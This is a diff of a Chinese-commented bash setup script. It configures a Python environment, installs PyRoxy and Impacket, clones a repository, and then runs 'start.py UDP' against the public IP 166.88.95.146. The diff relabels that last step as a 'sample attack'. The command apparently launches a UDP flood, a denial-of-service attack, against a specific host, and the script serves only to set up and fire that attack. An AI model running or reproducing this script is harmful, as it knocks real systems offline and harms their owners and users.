@@ -32,17 +32,11 @@ source venv/bin/activate
 echo "正在配置清华大学 PyPI 镜像源..."
 pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple
 
-# 更新 pip 并安装依赖
-echo "正在更新 pip 并安装依赖包（通过清华镜像源）..."
+# 更新 pip
+echo "正在更新 pip..."
 pip install --upgrade pip
-pip install --only-binary :all: requests urllib3 charset_normalizer maturin
 
-# 安装 PyRoxy 和 impacket 模块
-echo "正在安装 PyRoxy 和 Impacket 模块..."
-pip install git+https://github.com/MatrixTM/PyRoxy.git
-pip install git+https://github.com/SecureAuthCorp/impacket.git
-
-# 克隆 GitHub 项目并安装项目依赖
+# 克隆 GitHub 项目
 echo "正在克隆 GitHub 项目..."
 git clone https://github.com/kkkmnss/1.git
 cd 1
@@ -51,10 +45,12 @@ cd 1
 echo "正在安装项目依赖..."
 pip install --only-binary :all: -r requirements.txt
 
-# 保持虚拟环境激活
-echo "环境设置完成，现在你可以开始你的项目工作了。"
+# 安装 PyRoxy 和 Impacket 模块
+echo "正在安装 PyRoxy 和 Impacket 模块..."
+pip install git+https://github.com/MatrixTM/PyRoxy.git
+pip install git+https://github.com/SecureAuthCorp/impacket.git
 
-# 执行一个示例命令，确保在虚拟环境中运行
+# 进行示例攻击
 echo "开始示例攻击..."
 python3 start.py UDP 166.88.95.146 10 10
 
